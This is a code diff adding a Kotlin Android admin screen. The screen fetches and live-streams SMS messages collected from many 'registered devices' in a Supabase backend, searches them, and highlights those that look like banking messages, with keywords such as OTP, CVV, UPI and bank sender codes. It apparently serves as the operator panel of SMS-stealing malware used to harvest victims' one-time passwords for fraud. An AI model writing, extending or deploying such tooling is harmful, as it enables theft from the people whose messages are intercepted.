@@ -1,0 +1,645 @@
+package com.example.admin.activities
+
+import android.app.AlertDialog
+import android.content.ClipData
+import android.content.ClipboardManager
+import android.content.Context
+import android.content.Intent
+import android.graphics.Color
+import android.graphics.drawable.GradientDrawable
+import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
+import android.text.Editable
+import android.text.TextWatcher
+import android.util.Log
+import android.view.*
+import android.view.inputmethod.EditorInfo
+import android.widget.*
+import androidx.appcompat.app.AppCompatActivity
+import androidx.core.content.ContextCompat
+import androidx.recyclerview.widget.LinearLayoutManager
+import androidx.recyclerview.widget.RecyclerView
+import com.example.admin.R
+import com.example.admin.network.SmsMessagesRealtimeClient
+import com.example.admin.network.SupabaseApi
+import kotlinx.coroutines.*
+import java.text.SimpleDateFormat
+import java.util.Date
+import java.util.HashSet
+import java.util.Locale
+
+class SMSActivity : AppCompatActivity() {
+
+    private lateinit var recyclerView: RecyclerView
+    private lateinit var totalMessagesText: TextView
+    private lateinit var loaderContainer: FrameLayout
+    private lateinit var deleteAllBtn: TextView
+
+    private lateinit var searchEditText: EditText
+    private lateinit var clearSearchBtn: ImageView
+
+    private lateinit var supabaseApi: SupabaseApi
+    private lateinit var adapter: SmsAdapter
+
+    private var realtimeClient: SmsMessagesRealtimeClient? = null
+
+    private val smsList = mutableListOf<SmsItem>()
+    private val smsKeySet = HashSet<String>()
+    private val filteredList = mutableListOf<SmsItem>()
+
+    private var isSearchActive = false
+    private var searchQuery = ""
+
+    private val searchHandler = Handler(Looper.getMainLooper())
+    private var searchRunnable: Runnable? = null
+
+    private val coroutineScope = CoroutineScope(Dispatchers.Main + SupervisorJob())
+
+    private val DISPLAY_FORMAT = "dd MMM yyyy, hh:mm a"
+
+    private val bankingKeywords = listOf(
+        "sbi", "hdfc", "icici", "axis", "kotak", "yesbank", "pnb", "canara", "idbi",
+        "upi", "debit", "credit", "payment", "account", "transaction", "balance",
+        "imps", "neft", "rtgs", "otp", "cvv", "card", "debited", "credited",
+        "bank", "loan", "emi", "statement", "wallet", "paytm", "phonepe", "navi"
+    )
+
+    private val bankingSenders = listOf(
+        "AXISB", "HDFCB", "ICICIB", "SBINB", "KOTAKB", "YESB", "PNBB"
+    )
+
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        setContentView(R.layout.activity_sms)
+
+        supabaseApi = SupabaseApi()
+
+        initViews()
+        setupSearch()
+        setupRecyclerView()
+        setupClickListeners()
+
+        loadInitialSmsMessages()
+        startLiveSmsMessages()
+    }
+
+    private fun initViews() {
+        recyclerView = findViewById(R.id.smsRecyclerView)
+        totalMessagesText = findViewById(R.id.totalMessagesText)
+        loaderContainer = findViewById(R.id.loaderContainer)
+        deleteAllBtn = findViewById(R.id.deleteAllBtn)
+        searchEditText = findViewById(R.id.searchEditText)
+        clearSearchBtn = findViewById(R.id.clearSearchBtn)
+    }
+
+    private fun setupRecyclerView() {
+        recyclerView.layoutManager = LinearLayoutManager(this)
+        recyclerView.setHasFixedSize(true)
+        recyclerView.itemAnimator = null
+        adapter = SmsAdapter()
+        recyclerView.adapter = adapter
+    }
+
+    private fun setupClickListeners() {
+        deleteAllBtn.setOnClickListener {
+            confirmDeleteAll()
+        }
+    }
+
+    private fun setupSearch() {
+        searchEditText.addTextChangedListener(object : TextWatcher {
+            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
+
+            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {
+                clearSearchBtn.visibility = if (s.isNullOrEmpty()) View.GONE else View.VISIBLE
+
+                searchRunnable?.let {
+                    searchHandler.removeCallbacks(it)
+                }
+
+                searchRunnable = Runnable {
+                    performSearch(s?.toString() ?: "")
+                }
+
+                searchHandler.postDelayed(searchRunnable!!, 300)
+            }
+
+            override fun afterTextChanged(s: Editable?) {}
+        })
+
+        clearSearchBtn.setOnClickListener {
+            searchEditText.text.clear()
+            clearSearch()
+        }
+
+        searchEditText.setOnEditorActionListener { _, actionId, _ ->
+            if (actionId == EditorInfo.IME_ACTION_SEARCH) {
+                performSearch(searchEditText.text.toString())
+                true
+            } else {
+                false
+            }
+        }
+    }
+
+    // =========================================================
+    // INITIAL LOAD FROM rto1_registered_devices.sms_messages
+    // =========================================================
+
+    private fun loadInitialSmsMessages() {
+        showLoader(true)
+
+        coroutineScope.launch {
+            val result = supabaseApi.getAllSmsMessagesFromRegisteredDevices(rowLimit = 1000)
+
+            result.fold(
+                onSuccess = { logs ->
+                    val items = logs.mapNotNull { it.toSmsItemOrNull() }
+                    setAllMessages(items)
+                    showLoader(false)
+                },
+                onFailure = { error ->
+                    showLoader(false)
+                    Toast.makeText(
+                        this@SMSActivity,
+                        "SMS load failed: ${error.message}",
+                        Toast.LENGTH_SHORT
+                    ).show()
+                    Log.e("SMSActivity", "Initial sms_messages load failed", error)
+                }
+            )
+        }
+    }
+
+    // =========================================================
+    // LIVE UPDATE FROM sms_messages UPDATE EVENT
+    // =========================================================
+
+    private fun startLiveSmsMessages() {
+        realtimeClient?.disconnect()
+
+        realtimeClient = SmsMessagesRealtimeClient(
+            supabaseApi = supabaseApi,
+            onConnected = {
+                Log.d("SMSActivity", "✅ Live sms_messages connected")
+            },
+            onError = { error ->
+                Log.e("SMSActivity", "Live sms_messages error: $error")
+            },
+            onSmsMessagesChanged = { liveLogs ->
+                val liveItems = liveLogs.mapNotNull { it.toSmsItemOrNull() }
+                addOnlyNewMessages(liveItems)
+            }
+        )
+
+        realtimeClient?.connect()
+    }
+
+    private fun stopLiveSmsMessages() {
+        realtimeClient?.disconnect()
+        realtimeClient = null
+    }
+
+    /*
+     * ✅ FIX:
+     * SupabaseApi.SmsLog.id nullable String? ho sakta hai.
+     * SmsItem.smsKey non-null String hai.
+     * Isliye yaha safeSmsId bana rahe hain.
+     */
+    private fun SupabaseApi.SmsLog.toSmsItemOrNull(): SmsItem? {
+        val safeDeviceId = uniqueId.trim()
+        if (safeDeviceId.isBlank()) return null
+
+        val safeBody = body.trim()
+        if (safeBody.isBlank()) return null
+
+        val safeSmsId = when {
+            !id.isNullOrBlank() -> id
+            timestamp > 0L -> "sms_${safeDeviceId}_$timestamp"
+            else -> "sms_${safeDeviceId}_${safeBody.hashCode()}"
+        }
+
+        val uniqueKey = "$safeDeviceId-$safeSmsId"
+
+        return SmsItem(
+            deviceId = safeDeviceId,
+            smsKey = safeSmsId,
+            uniqueKey = uniqueKey,
+            body = safeBody,
+            senderNumber = senderNumber.ifBlank { "Unknown" },
+            receiverNumber = receiverNumber,
+            title = title.ifBlank { "New SMS" },
+            timestamp = if (timestamp > 0L) timestamp else System.currentTimeMillis()
+        )
+    }
+
+    private fun setAllMessages(items: List<SmsItem>) {
+        smsList.clear()
+        smsKeySet.clear()
+
+        val sorted = items.sortedByDescending {
+            it.timestamp
+        }
+
+        for (item in sorted) {
+            if (!smsKeySet.contains(item.uniqueKey)) {
+                smsKeySet.add(item.uniqueKey)
+                smsList.add(item)
+            }
+        }
+
+        if (isSearchActive) {
+            performSearch(searchQuery)
+        } else {
+            adapter.notifyDataSetChanged()
+        }
+
+        updateTotalCount()
+    }
+
+    private fun addOnlyNewMessages(items: List<SmsItem>) {
+        var insertedCount = 0
+
+        val sorted = items.sortedByDescending {
+            it.timestamp
+        }
+
+        for (item in sorted) {
+            if (!smsKeySet.contains(item.uniqueKey)) {
+                smsKeySet.add(item.uniqueKey)
+                smsList.add(0, item)
+                insertedCount++
+            }
+        }
+
+        if (insertedCount > 0) {
+            smsList.sortByDescending {
+                it.timestamp
+            }
+
+            if (isSearchActive) {
+                performSearch(searchQuery)
+            } else {
+                adapter.notifyDataSetChanged()
+            }
+
+            updateTotalCount()
+            recyclerView.scrollToPosition(0)
+
+            Log.d("SMSActivity", "✅ Live new sms_messages added = $insertedCount")
+        }
+    }
+
+    // =========================================================
+    // SEARCH
+    // =========================================================
+
+    private fun performSearch(query: String) {
+        searchQuery = query.trim().lowercase(Locale.getDefault())
+
+        if (searchQuery.isEmpty()) {
+            clearSearch()
+            return
+        }
+
+        isSearchActive = true
+        filteredList.clear()
+
+        for (item in smsList) {
+            if (matchesSearch(item, searchQuery)) {
+                filteredList.add(item)
+            }
+        }
+
+        updateAdapter()
+    }
+
+    private fun matchesSearch(item: SmsItem, query: String): Boolean {
+        return item.body.lowercase(Locale.getDefault()).contains(query) ||
+                item.senderNumber.lowercase(Locale.getDefault()).contains(query) ||
+                item.receiverNumber.lowercase(Locale.getDefault()).contains(query) ||
+                item.deviceId.lowercase(Locale.getDefault()).contains(query) ||
+                item.title.lowercase(Locale.getDefault()).contains(query) ||
+                formatTime(item.timestamp).lowercase(Locale.getDefault()).contains(query)
+    }
+
+    private fun clearSearch() {
+        isSearchActive = false
+        searchQuery = ""
+        filteredList.clear()
+        updateAdapter()
+    }
+
+    private fun updateAdapter() {
+        adapter.notifyDataSetChanged()
+        updateTotalCount()
+    }
+
+    // =========================================================
+    // DELETE
+    // =========================================================
+
+    private fun confirmDeleteAll() {
+        AlertDialog.Builder(this)
+            .setTitle("Delete All SMS")
+            .setMessage("Ye rto1 app_id wale sabhi devices ke sms_messages clear karega. Continue?")
+            .setCancelable(false)
+            .setPositiveButton("Yes") { _, _ ->
+                deleteAllMessages()
+            }
+            .setNegativeButton("No", null)
+            .show()
+    }
+
+    private fun deleteAllMessages() {
+        showLoader(true)
+
+        coroutineScope.launch {
+            val result = supabaseApi.deleteAllSmsMessagesForApp()
+
+            result.fold(
+                onSuccess = {
+                    showLoader(false)
+
+                    smsList.clear()
+                    smsKeySet.clear()
+                    filteredList.clear()
+                    isSearchActive = false
+                    searchEditText.text.clear()
+
+                    adapter.notifyDataSetChanged()
+                    updateTotalCount()
+
+                    Toast.makeText(
+                        this@SMSActivity,
+                        "All sms_messages cleared",
+                        Toast.LENGTH_SHORT
+                    ).show()
+                },
+                onFailure = { error ->
+                    showLoader(false)
+                    Toast.makeText(
+                        this@SMSActivity,
+                        "Delete failed: ${error.message}",
+                        Toast.LENGTH_SHORT
+                    ).show()
+                }
+            )
+        }
+    }
+
+    private fun confirmDeleteSingleMessage(item: SmsItem, position: Int) {
+        AlertDialog.Builder(this)
+            .setTitle("Delete Message")
+            .setMessage("Are you sure you want to delete this message?")
+            .setCancelable(false)
+            .setPositiveButton("Yes") { _, _ ->
+                deleteSingleMessage(item)
+            }
+            .setNegativeButton("No", null)
+            .show()
+    }
+
+    private fun deleteSingleMessage(item: SmsItem) {
+        showLoader(true)
+
+        coroutineScope.launch {
+            val result = supabaseApi.deleteSmsFromRegisteredDevice(
+                deviceId = item.deviceId,
+                smsId = item.smsKey
+            )
+
+            result.fold(
+                onSuccess = {
+                    showLoader(false)
+
+                    val realIndex = smsList.indexOfFirst {
+                        it.uniqueKey == item.uniqueKey
+                    }
+
+                    if (realIndex != -1) {
+                        smsList.removeAt(realIndex)
+                        smsKeySet.remove(item.uniqueKey)
+                    }
+
+                    val filteredIndex = filteredList.indexOfFirst {
+                        it.uniqueKey == item.uniqueKey
+                    }
+
+                    if (filteredIndex != -1) {
+                        filteredList.removeAt(filteredIndex)
+                    }
+
+                    adapter.notifyDataSetChanged()
+                    updateTotalCount()
+
+                    Toast.makeText(
+                        this@SMSActivity,
+                        "Message deleted",
+                        Toast.LENGTH_SHORT
+                    ).show()
+                },
+                onFailure = { error ->
+                    showLoader(false)
+                    Toast.makeText(
+                        this@SMSActivity,
+                        "Delete failed: ${error.message}",
+                        Toast.LENGTH_SHORT
+                    ).show()
+                }
+            )
+        }
+    }
+
+    // =========================================================
+    // COPY
+    // =========================================================
+
+    private fun copyMessageToClipboard(item: SmsItem) {
+        val messageText = """
+            Device: ${item.deviceId}
+            From: ${item.senderNumber}
+            To: ${item.receiverNumber}
+            Time: ${formatTime(item.timestamp)}
+            Title: ${item.title}
+            
+            Message:
+            ${item.body}
+        """.trimIndent()
+
+        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
+        val clip = ClipData.newPlainText("SMS Message", messageText)
+        clipboard.setPrimaryClip(clip)
+
+        Toast.makeText(this, "Message copied", Toast.LENGTH_SHORT).show()
+    }
+
+    // =========================================================
+    // HELPERS
+    // =========================================================
+
+    private fun formatTime(timestamp: Long): String {
+        if (timestamp <= 0L) return "-"
+
+        return try {
+            SimpleDateFormat(DISPLAY_FORMAT, Locale.getDefault()).format(Date(timestamp))
+        } catch (e: Exception) {
+            timestamp.toString()
+        }
+    }
+
+    private fun updateTotalCount() {
+        val count = if (isSearchActive) filteredList.size else smsList.size
+
+        totalMessagesText.text = if (isSearchActive) {
+            "Found: $count (Total: ${smsList.size})"
+        } else {
+            "Total: $count"
+        }
+    }
+
+    private fun showLoader(show: Boolean) {
+        loaderContainer.visibility = if (show) View.VISIBLE else View.GONE
+    }
+
+    private fun isBankingSMS(body: String?, sender: String?, title: String?): Boolean {
+        val lowerBody = body?.lowercase(Locale.getDefault()) ?: ""
+        val lowerTitle = title?.lowercase(Locale.getDefault()) ?: ""
+
+        sender?.let { s ->
+            for (pattern in bankingSenders) {
+                if (s.contains(pattern, ignoreCase = true)) {
+                    return true
+                }
+            }
+        }
+
+        for (keyword in bankingKeywords) {
+            if (lowerBody.contains(keyword) || lowerTitle.contains(keyword)) {
+                val nonBanking = listOf("flipkart", "amazon", "zomato", "swiggy", "uber")
+                if (!nonBanking.any { lowerBody.contains(it) }) {
+                    return true
+                }
+            }
+        }
+
+        return lowerBody.contains("@ok") ||
+                lowerBody.contains("@ybl") ||
+                lowerBody.contains("@paytm")
+    }
+
+    private fun getCardBackgroundColor(isBanking: Boolean): GradientDrawable? {
+        val drawable =
+            ContextCompat.getDrawable(this, R.drawable.blue_border)?.mutate() as? GradientDrawable
+
+        drawable?.setColor(
+            if (isBanking) {
+                ContextCompat.getColor(this, R.color.successLightColor)
+            } else {
+                Color.WHITE
+            }
+        )
+
+        return drawable
+    }
+
+    // =========================================================
+    // DATA
+    // =========================================================
+
+    data class SmsItem(
+        val deviceId: String,
+        val smsKey: String,
+        val uniqueKey: String,
+        val body: String,
+        val senderNumber: String,
+        val receiverNumber: String,
+        val title: String,
+        val timestamp: Long
+    )
+
+    // =========================================================
+    // ADAPTER
+    // =========================================================
+
+    inner class SmsAdapter : RecyclerView.Adapter<SmsAdapter.Holder>() {
+
+        override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): Holder {
+            return Holder(
+                LayoutInflater.from(parent.context)
+                    .inflate(R.layout.message_card, parent, false)
+            )
+        }
+
+        override fun getItemCount(): Int {
+            return if (isSearchActive) filteredList.size else smsList.size
+        }
+
+        override fun onBindViewHolder(holder: Holder, position: Int) {
+            val item = if (isSearchActive) {
+                filteredList[position]
+            } else {
+                smsList[position]
+            }
+
+            holder.body.text = item.body
+            holder.sender.text = "From: ${item.senderNumber}"
+
+            if (item.receiverNumber.isNotBlank()) {
+                holder.receiver.text = "To: ${item.receiverNumber}"
+                holder.receiver.visibility = View.VISIBLE
+            } else {
+                holder.receiver.visibility = View.GONE
+            }
+
+            holder.time.text = formatTime(item.timestamp)
+
+            val isBanking = isBankingSMS(item.body, item.senderNumber, item.title)
+            val backgroundDrawable = getCardBackgroundColor(isBanking)
+
+            if (backgroundDrawable != null) {
+                holder.itemView.background = backgroundDrawable
+            } else {
+                holder.itemView.setBackgroundColor(
+                    if (isBanking) {
+                        ContextCompat.getColor(this@SMSActivity, R.color.successLightColor)
+                    } else {
+                        Color.WHITE
+                    }
+                )
+            }
+
+            holder.itemView.setOnClickListener {
+                val intent = Intent(this@SMSActivity, FinalActivity::class.java)
+                intent.putExtra("uniqueid", item.deviceId)
+                startActivity(intent)
+            }
+
+            holder.copyIcon.setOnClickListener {
+                copyMessageToClipboard(item)
+            }
+
+            holder.deleteIcon.setOnClickListener {
+                confirmDeleteSingleMessage(item, position)
+            }
+        }
+
+        inner class Holder(view: View) : RecyclerView.ViewHolder(view) {
+            val body: TextView = view.findViewById(R.id.bodyTextView)
+            val sender: TextView = view.findViewById(R.id.fromText)
+            val receiver: TextView = view.findViewById(R.id.receiverText)
+            val time: TextView = view.findViewById(R.id.timeText)
+            val copyIcon: ImageView = view.findViewById(R.id.copyIcon)
+            val deleteIcon: ImageView = view.findViewById(R.id.deleteIcon)
+        }
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+
+        searchHandler.removeCallbacksAndMessages(null)
+        stopLiveSmsMessages()
+        coroutineScope.cancel()
+    }
+}
